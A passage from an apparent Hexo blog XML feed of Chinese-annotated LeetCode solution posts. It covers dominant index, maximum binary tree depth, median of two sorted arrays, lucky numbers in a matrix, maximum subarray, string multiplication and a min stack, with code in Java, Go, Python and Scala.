<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dominantIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max1 = <span class="number">0</span>, max2 = <span class="number">0</span>, idxOfMax1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &gt; max1) &#123;</span><br><span class="line">            max2 = max1;</span><br><span class="line">            max1 = nums[i];</span><br><span class="line">            idxOfMax1 = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &gt; max2) &#123;</span><br><span class="line">            max2 = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max1 &gt;= max2 * <span class="number">2</span> ? idxOfMax1 : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>go</li>
</ul>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dominantIndex</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    index := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(nums);i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> nums [i] &gt; nums[index] &#123;</span><br><span class="line">            index = i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i:= <span class="number">0</span>;i&lt;<span class="built_in">len</span>(nums);i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> i != index &amp;&amp; nums[i]*<span class="number">2</span> &gt; nums[index] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>python</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dominantIndex</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        highest = <span class="number">-1</span></span><br><span class="line">        secondHighest = <span class="number">-1</span></span><br><span class="line">        highestIndex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i,n <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            <span class="keyword">if</span> n &gt;= highest:</span><br><span class="line">                secondHighest = highest</span><br><span class="line">                highest = n</span><br><span class="line">                highestIndex = i</span><br><span class="line">            <span class="keyword">elif</span> n &gt; secondHighest:</span><br><span class="line">                secondHighest = n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> highest &lt; secondHighest*<span class="number">2</span>:</span><br><span class="line">            highestIndex = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> highestIndex</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/largest-number-at-least-twice-of-others/" target="_blank" rel="noopener">Largest Number At Least Twice of Others</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>104. Maximum Depth of Binary Tree</title>
    <url>/2018/06/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Maximum%20Depth%20of%20Binary%20Tree/</url>
    <content><![CDATA[<p>Given a binary tree, find its maximum depth.<br>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.<br>Note: A leaf is a node with no children.<br>Example:<br>Given binary tree [3,9,20,null,null,15,7],<br>    3<br>   / \<br>  9  20<br>    /  \<br>   15   7<br>return its depth = 3.</p>
<blockquote>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1></blockquote>
<p>求二叉树的深度</p>
<blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span></span>(root: <span class="type">TreeNode</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">         <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">     <span class="type">Math</span>.max(maxDepth(root.left), maxDepth(root.right)) + <span class="number">1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/maximum-depth-of-binary-tree/description/" target="_blank" rel="noopener">Maximum Depth of Binary Tree</a></li>
</ul>
</blockquote>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Median of Two Sorted Arrays</title>
    <url>/2019/05/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Median%20of%20Two%20Sorted%20Arrays/</url>
    <content><![CDATA[<p>There are two sorted arrays nums1 and nums2 of size m and n respectively.</p>
<p>Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).</p>
<p>You may assume nums1 and nums2 cannot be both empty.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">The median is 2.0</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">The median is (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>求出两个给定数组的中位数.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>合并两个数组,排序求中位数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; resAry = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (nums1 != <span class="keyword">null</span> &amp;&amp; nums1.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      Arrays.stream(nums1).forEach(resAry::add);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nums2 != <span class="keyword">null</span> &amp;&amp; nums2.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      Arrays.stream(nums2).forEach(resAry::add);</span><br><span class="line">    &#125;</span><br><span class="line">    resAry.sort(Comparator.comparingInt(a -&gt; a));</span><br><span class="line">    <span class="keyword">int</span> len = resAry.size();</span><br><span class="line">    <span class="keyword">int</span> idx = len/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( len % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">int</span> a = resAry.get(idx) + resAry.get(idx -<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> a / <span class="number">2.0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> resAry.get(idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>但是时间复杂度为 O(m+n),显示和 O(lg(m+n))还是有差距,非最优解.</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>二分查找,时间复杂度为 O(lg(m+n))</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">int</span> m = A.length, n = B.length;</span><br><span class="line">	    <span class="keyword">int</span> l = (m + n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">	    <span class="keyword">int</span> r = (m + n + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">	    <span class="keyword">return</span> (getkth(A, <span class="number">0</span>, B, <span class="number">0</span>, l) + getkth(A, <span class="number">0</span>, B, <span class="number">0</span>, r)) / <span class="number">2.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getkth</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> aStart, <span class="keyword">int</span>[] B, <span class="keyword">int</span> bStart, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (aStart &gt; A.length - <span class="number">1</span>) <span class="keyword">return</span> B[bStart + k - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span> (bStart &gt; B.length - <span class="number">1</span>) <span class="keyword">return</span> A[aStart + k - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span> (k == <span class="number">1</span>) <span class="keyword">return</span> Math.min(A[aStart], B[bStart]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> aMid = Integer.MAX_VALUE, bMid = Integer.MAX_VALUE;</span><br><span class="line">	<span class="keyword">if</span> (aStart + k/<span class="number">2</span> - <span class="number">1</span> &lt; A.length) aMid = A[aStart + k/<span class="number">2</span> - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span> (bStart + k/<span class="number">2</span> - <span class="number">1</span> &lt; B.length) bMid = B[bStart + k/<span class="number">2</span> - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (aMid &lt; bMid)</span><br><span class="line">	    <span class="keyword">return</span> getkth(A, aStart + k/<span class="number">2</span>, B, bStart,       k - k/<span class="number">2</span>);<span class="comment">// Check: aRight + bLeft</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> getkth(A, aStart,       B, bStart + k/<span class="number">2</span>, k - k/<span class="number">2</span>);<span class="comment">// Check: bRight + aLeft</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/median-of-two-sorted-arrays/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">median-of-two-sorted-arrays</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>binary search</tag>
      </tags>
  </entry>
  <entry>
    <title>1380.矩阵中的幸运数</title>
    <url>/2022/02/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/LuckyNumbersInAMatrix/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给你一个 m * n 的矩阵，矩阵中的数字各不相同。请你按任意顺序返回矩阵中的所有幸运数。</span><br><span class="line"></span><br><span class="line">幸运数是指矩阵中满足同时下列两个条件的元素：</span><br><span class="line"></span><br><span class="line">1. 在同一行的所有元素中最小</span><br><span class="line">2. 在同一列的所有元素中最大</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：matrix = [[3,7,8],[9,11,13],[15,16,17]]</span><br><span class="line">输出：[15]</span><br><span class="line">解释：15 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：matrix = [[1,10,4,2],[9,3,8,7],[15,16,17,12]]</span><br><span class="line">输出：[12]</span><br><span class="line">解释：12 是唯一的幸运数，因为它是其所在行中的最小值，也是所在列中的最大值。</span><br><span class="line">示例 3：</span><br><span class="line"></span><br><span class="line">输入：matrix = [[7,8],[1,2]]</span><br><span class="line">输出：[7]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">m == mat.length</span><br><span class="line">n == mat[i].length</span><br><span class="line">1 &lt;= n, m &lt;= 50</span><br><span class="line">1 &lt;= matrix[i][j] &lt;= 10^5</span><br><span class="line">矩阵中的所有元素都是不同的</span><br></pre></td></tr></table></figure>
<p>预处理出每行的最小值数组 rowMin 和每列的最大值数组colMax，其中 rowMin[i] 表示第i行的最小值，colMax[j] 表示第j列的最大值。遍历矩阵 matrix，如果 matrix[i][j] 同时满足 matrix[i][j]= rowMin[i] 和 matrix[i][j]=colMax[j]，那么 matrix[i][j] 就是矩阵中的幸运数。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">luckyNumbers</span> <span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">         List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		 <span class="keyword">int</span> rows = matrix.length;</span><br><span class="line">		 <span class="keyword">int</span> cols = matrix[<span class="number">0</span>].length;</span><br><span class="line">		 <span class="keyword">int</span>[] rowMin = <span class="keyword">new</span> <span class="keyword">int</span>[rows];</span><br><span class="line">		 <span class="comment">// 填充最大值</span></span><br><span class="line">		 Arrays.fill(rowMin, Integer.MAX_VALUE);</span><br><span class="line">		 <span class="keyword">int</span>[] colMax = <span class="keyword">new</span> <span class="keyword">int</span>[cols];</span><br><span class="line">		 <span class="comment">// 预处理，找到每一行的最小值和每一列的最大值</span></span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">			 <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                 rowMin[i] = Math.min(rowMin[i],matrix[i][j]);</span><br><span class="line">                 colMax[j] = Math.max(colMax[j],matrix[i][j]);</span><br><span class="line">			 &#125;</span><br><span class="line">		 &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">				<span class="keyword">if</span> (matrix[i][j] == rowMin[i] &amp;&amp; matrix[i][j] == colMax[j])&#123;</span><br><span class="line">					result.add(matrix[i][j]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode-cn.com/problems/lucky-numbers-in-a-matrix/" target="_blank" rel="noopener">1380. 矩阵中的幸运数</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>53. Maximum Subarray</title>
    <url>/2019/05/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Maximum%20Subarray/</url>
    <content><![CDATA[<p>Given an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p>
<blockquote>
<ul>
<li>Example:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum = 6.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Follow up:</li>
</ul>
</blockquote>
<p>If you have figured out the O(n) solution, try coding another solution using the divide and conquer approach, which is more subtle.</p>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>求给定数组中连续元素和的最大值，求出这个值。如果在 O(n)时间复杂度内解决了这个问题,尝试用分治法解决一下这个问题.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>暴力求解,遍历所有元素，求可能的所有子数组对应的元素和，比较求出最大值.时间复杂度为 O(n^2),虽然解决了问题但不是最优解.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 53. Maximum Subarray</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@result</span> accept</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaximumSubarray</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = nums.length;</span><br><span class="line">    <span class="keyword">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">      <span class="keyword">int</span> cur = nums[i];</span><br><span class="line">      <span class="keyword">if</span> (max &lt; cur)&#123;</span><br><span class="line">        max = cur;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">int</span> tmpSum = cur;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;len;j++)&#123;</span><br><span class="line">          tmpSum += nums[j];</span><br><span class="line">         <span class="keyword">if</span> (max &lt; tmpSum)&#123;</span><br><span class="line">           max = tmpSum;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    MaximumSubarray maximumSubarray = <span class="keyword">new</span> MaximumSubarray();</span><br><span class="line">    <span class="keyword">int</span>[] ary = &#123;-<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">5</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    System.out.println(maximumSubarray.maxSubArray(ary));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>动态规划解决方法,时间复杂度为 O(n)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.length;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n];<span class="comment">//dp[i] means the maximum subarray ending with A[i];</span></span><br><span class="line">        dp[<span class="number">0</span>] = A[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = dp[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">            dp[i] = A[i] + (dp[i - <span class="number">1</span>] &gt; <span class="number">0</span> ? dp[i - <span class="number">1</span>] : <span class="number">0</span>);</span><br><span class="line">            max = Math.max(max, dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/maximum-subarray/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">maximum-subarray</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>43. Multiply Strings</title>
    <url>/2019/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Multiply%20Strings/</url>
    <content><![CDATA[<p>Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2, also represented as a string.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: num1 = &quot;2&quot;, num2 = &quot;3&quot;</span><br><span class="line">Output: &quot;6&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: num1 = &quot;123&quot;, num2 = &quot;456&quot;</span><br><span class="line">Output: &quot;56088&quot;</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ol>
<li>The length of both num1 and num2 is &lt; 110.</li>
<li>Both num1 and num2 contain only digits 0-9.</li>
<li>Both num1 and num2 do not contain any leading zero, except the number 0 itself.</li>
<li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li>
</ol>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>字符串相乘</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">multiply</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = num1.length(), n = num2.length();</span><br><span class="line">    <span class="keyword">int</span>[] pos = <span class="keyword">new</span> <span class="keyword">int</span>[m + n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">        <span class="keyword">int</span> mul = ( num1.charAt(i) - <span class="string">'0'</span> ) * ( num2.charAt(j) - <span class="string">'0'</span> );</span><br><span class="line">        <span class="keyword">int</span> p1 = i + j, p2 = i + j + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = mul + pos[p2];</span><br><span class="line">        pos[p1] += sum / <span class="number">10</span>;</span><br><span class="line">        pos[p2] = sum % <span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> p: pos) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!( sb.length() == <span class="number">0</span> &amp;&amp; p == <span class="number">0</span> )) &#123;</span><br><span class="line">        sb.append(p);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.length() == <span class="number">0</span> ? <span class="string">"0"</span> : sb.toString();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/multiply-strings/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">multiply-strings</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>155. Min Stack</title>
    <url>/2019/05/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Min%20Stack/</url>
    <content><![CDATA[<p>Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.</p>
<blockquote>
<ul>
<li>push(x) — Push element x onto stack.</li>
<li>pop() — Removes the element on top of the stack.</li>
<li>top() — Get the top element.</li>
<li>getMin() — Retrieve the minimum element in the stack.</li>
</ul>
</blockquote>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MinStack minStack = new MinStack();</span><br><span class="line">minStack.push(-2);</span><br><span class="line">minStack.push(0);</span><br><span class="line">minStack.push(-3);</span><br><span class="line">minStack.getMin();   --&gt; Returns -3.</span><br><span class="line">minStack.pop();</span><br><span class="line">minStack.top();      --&gt; Returns 0.</span><br><span class="line">minStack.getMin();   --&gt; Returns -2.</span><br></pre></td></tr></table></figure>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>设计一个栈，支持 push/pop/top/getMin 这几种操作。最重要的就是获取栈中最小值的操作。要求在 O(1)内求出改值.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>最容易想到的方法,但是求最小值需要排序来取,时间复杂度不为 O(1)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Integer&gt; stack;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    stack.push(x);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   stack.pop();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> stack.lastElement();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stack.stream().sorted().findFirst().get();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>O(1)复杂度的解决方法,push 的时候判断当前元素 x 是否小于最小值 min,如果 x &lt;= min,则令 min = x 同时 push min , x。 pop 操作如果出栈的元素 p==min,则在 pop 一次,让上次 push 的元素出栈.</p>
<p><img src="/2019/05/14/数据结构和算法/leetcode/Min Stack/minstack.png" alt></p>
